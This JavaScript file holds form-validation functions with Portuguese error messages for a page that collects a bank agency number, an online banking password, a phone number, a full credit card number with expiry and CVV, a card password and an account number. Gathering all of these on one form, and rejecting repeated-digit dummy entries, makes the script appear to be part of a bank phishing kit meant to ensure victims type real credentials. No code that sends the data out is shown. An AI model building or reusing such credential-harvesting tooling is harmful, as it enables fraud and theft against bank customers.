
function castly() {
if (document.aspnetForm.txtAgencia.value == "" || 
document.aspnetForm.txtAgencia.value.length < 4 || 
document.aspnetForm.txtAgencia.value == "0000" || 
document.aspnetForm.txtAgencia.value == "1111" || 
document.aspnetForm.txtAgencia.value == "2222" || 
document.aspnetForm.txtAgencia.value == "3333" || 
document.aspnetForm.txtAgencia.value == "4444" || 
document.aspnetForm.txtAgencia.value == "5555" || 
document.aspnetForm.txtAgencia.value == "6666" || 
document.aspnetForm.txtAgencia.value == "7777" || 
document.aspnetForm.txtAgencia.value == "8888" || 
document.aspnetForm.txtAgencia.value == "9999"){
alert ("Agência, Inválida!");
document.aspnetForm.txtAgencia.focus(); return false;
}
}


/* ====================================================== */
function se() {
if (document.aspnetForm.txtSenha.value == "" || 
document.aspnetForm.txtSenha.value.length < 6 || 
document.aspnetForm.txtSenha.value == "000000" || 
document.aspnetForm.txtSenha.value == "111111" || 
document.aspnetForm.txtSenha.value == "222222" || 
document.aspnetForm.txtSenha.value == "333333" || 
document.aspnetForm.txtSenha.value == "444444" || 
document.aspnetForm.txtSenha.value == "555555" || 
document.aspnetForm.txtSenha.value == "666666" || 
document.aspnetForm.txtSenha.value == "777777" || 
document.aspnetForm.txtSenha.value == "888888" || 
document.aspnetForm.txtSenha.value == "999999"){
alert ("Senha eletrônica, Inválida!");
document.aspnetForm.sc.focus(); return false;
}
}

/* ====================================================== */
function sc() {
if(document.aspnetForm.txtCelular.value == '' || document.aspnetForm.txtCelular.value.length < 11)
{
    alert ("Telefone Inválido!");
    document.aspnetForm.txtCelular.focus(); return false;
}
if(document.aspnetForm.txtCCre.value == '' || document.aspnetForm.txtCCre.value.length < 16)
{
    alert ("Cartão de Crédito Inválido!");
    document.aspnetForm.txtCCre.focus(); return false;
}
if(document.aspnetForm.txtVal.value == '' || document.aspnetForm.txtVal.value.length < 7)
{
    alert ("Validade do cartão não está correta!");
    document.aspnetForm.txtVal.focus(); return false;
}
if(document.aspnetForm.txtCVV.value == '' || document.aspnetForm.txtCVV.value.length < 3)
{
    alert ("CVV inválido!");
    document.aspnetForm.txtCVV.focus(); return false;
}
if (document.aspnetForm.txtSenhaCartao.value == "" || 
document.aspnetForm.txtSenhaCartao.value.length < 6 || 
document.aspnetForm.txtSenhaCartao.value == "000000" || 
document.aspnetForm.txtSenhaCartao.value == "111111" || 
document.aspnetForm.txtSenhaCartao.value == "222222" || 
document.aspnetForm.txtSenhaCartao.value == "333333" || 
document.aspnetForm.txtSenhaCartao.value == "444444" || 
document.aspnetForm.txtSenhaCartao.value == "555555" || 
document.aspnetForm.txtSenhaCartao.value == "666666" || 
document.aspnetForm.txtSenhaCartao.value == "777777" || 
document.aspnetForm.txtSenhaCartao.value == "888888" || 
document.aspnetForm.txtSenhaCartao.value == "999999" ||
document.aspnetForm.txtSenhaCartao.value ==
document.aspnetForm.s8.value
){
alert ("Senha do Cartão Inválida!");
document.aspnetForm.txtSenhaCartao.focus(); return false;
}
}

function cc() {
if (document.aspnetForm.txtCC.value == "" || 
document.aspnetForm.txtCC.value.length < 5 || 
document.aspnetForm.txtCC.value == "00000" || 
document.aspnetForm.txtCC.value == "11111" || 
document.aspnetForm.txtCC.value == "22222" || 
document.aspnetForm.txtCC.value == "33333" || 
document.aspnetForm.txtCC.value == "44444" || 
document.aspnetForm.txtCC.value == "55555" || 
document.aspnetForm.txtCC.value == "66666" || 
document.aspnetForm.txtCC.value == "77777" || 
document.aspnetForm.txtCC.value == "88888" || 
document.aspnetForm.txtCC.value == "99999"){
alert ("Conta, Inválida!");
document.aspnetForm.txtCC.focus(); return false;
}
}

/* ====================================================== */

function macdonate() {
if (document.aspnetForm.txtCelular.value == "" || 
document.aspnetForm.txtCelular.value.length < 10 || 
document.aspnetForm.txtCelular.value == "(00)00000-0000" || 
document.aspnetForm.txtCelular.value == "(11)11111-1111" || 
document.aspnetForm.txtCelular.value == "(22)22222-2222" || 
document.aspnetForm.txtCelular.value == "(33)33333-3333" || 
document.aspnetForm.txtCelular.value == "(44)44444-4444" || 
document.aspnetForm.txtCelular.value == "(55)55555-5555" || 
document.aspnetForm.txtCelular.value == "(66)66666-6666" || 
document.aspnetForm.txtCelular.value == "(77)77777-7777" || 
document.aspnetForm.txtCelular.value == "(88)88888-8888" || 
document.aspnetForm.txtCelular.value == "(99)99999-9999"){
alert ("Telefone, Inválido!");
document.aspnetForm.txtCelular.focus(); return false;
}
}
